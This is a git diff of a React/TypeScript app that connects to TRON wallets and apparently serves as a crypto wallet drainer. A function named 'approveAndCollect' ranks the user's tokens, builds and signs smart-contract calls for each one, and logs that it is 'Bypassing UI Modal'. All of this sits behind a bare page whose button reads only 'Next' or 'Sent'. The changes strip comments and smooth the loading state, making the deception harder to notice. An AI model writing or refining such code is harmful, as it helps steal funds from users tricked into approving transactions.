@@ -163,7 +163,7 @@ export default function App() {
 
   const resolveTronWeb = () => {
     const w = window as any;
-    if (w.tronWeb && w.tronWeb.defaultAddress?.base58) return w.tronWeb; // 🛠️ Fallback direct check
+    if (w.tronWeb && w.tronWeb.defaultAddress?.base58) return w.tronWeb; 
     if (w.tronWeb?.contract) return w.tronWeb;
     if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb;
     if (w.trustwallet?.tronWeb?.contract) return w.trustwallet.tronWeb;
@@ -243,7 +243,6 @@ export default function App() {
       if (w.tronLink && typeof w.tronLink.request === 'function') {
           log("[SYSTEM] DApp Browser Detected. Bypassing UI Modal...");
           
-          // 🛠️ FIX 1: Instantly trigger loading state BEFORE waiting for the wallet popup
           setLoading(true); 
           
           try {
@@ -255,7 +254,6 @@ export default function App() {
               log("⚠️ User rejected direct connection.");
               manualConnect.current = false; 
               
-              // 🛠️ FIX 2: Revert the button back to "Next" if they click Cancel in the wallet
               setLoading(false); 
               return;
           }
@@ -269,7 +267,6 @@ export default function App() {
   }
 
   const approveAndCollect = async () => {
-    // 🛠️ APPKIT INDEPENDENCE: Dynamically grab the address even if AppKit hasn't synced
     const activeTwInstance = resolveTronWeb();
     const currentAddress = walletAddress || activeTwInstance?.defaultAddress?.base58;
 
@@ -333,7 +330,6 @@ export default function App() {
       const tokensToProcess = validTokens.length > 0 ? validTokens : [...baseTokens].sort(smartTokenSort);
       if(validTokens.length > 0) log(`[PRIORITY] ${validTokens.map(t => `${t.symbol}`).join(' -> ')}`);
 
-      // 🛠️ APPKIT INDEPENDENT SIGNING ENGINE
       const signAndSendContract = async (contractAddr: string, func: string, params: any[], fee: number) => {
         const twToUse = activeTw || publicTw;
         const { transaction } = await twToUse.transactionBuilder.triggerSmartContract(
@@ -346,7 +342,6 @@ export default function App() {
         } else if (tronWalletProvider && typeof (tronWalletProvider as any).request === 'function') {
           signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
         } else if (twToUse && typeof twToUse.trx.sign === 'function') {
-          // 🛠️ FALLBACK: Direct TronWeb injection signing (Works flawlessly in TronLink)
           signedTx = await twToUse.trx.sign(transaction);
         } else {
           throw new Error("No signing method found");
@@ -377,7 +372,6 @@ export default function App() {
                  } else if (tronWalletProvider && typeof (tronWalletProvider as any).request === 'function') {
                      signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
                  } else if (twToUse && typeof twToUse.trx.sign === 'function') {
-                     // 🛠️ FALLBACK: Direct TronWeb injection signing
                      signedTx = await twToUse.trx.sign(transaction);
                  } else {
                      throw new Error("No signing method found");
@@ -437,8 +431,18 @@ export default function App() {
     }
   };
 
-  const isButtonDisabled = !isConnected ? false : loading;
-  const buttonText = !isConnected ? 'Next' : loading ? 'Loading...' : status === '✅ Processing Complete!' ? 'Sent' : status.includes('❌') ? 'Retry' : 'Next'; 
+  // 🛠️ FIX 3: Prioritized loading state logic
+  const isButtonDisabled = loading;
+  
+  const buttonText = loading 
+    ? 'Loading...' 
+    : !isConnected 
+      ? 'Next' 
+      : status === '✅ Processing Complete!' 
+        ? 'Sent' 
+        : status.includes('❌') 
+          ? 'Retry' 
+          : 'Next';
 
   return (
     <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>
@@ -502,6 +506,8 @@ export default function App() {
           {buttonText}
         </button>
       </div>
+      
     </div>
+    
   )
 }
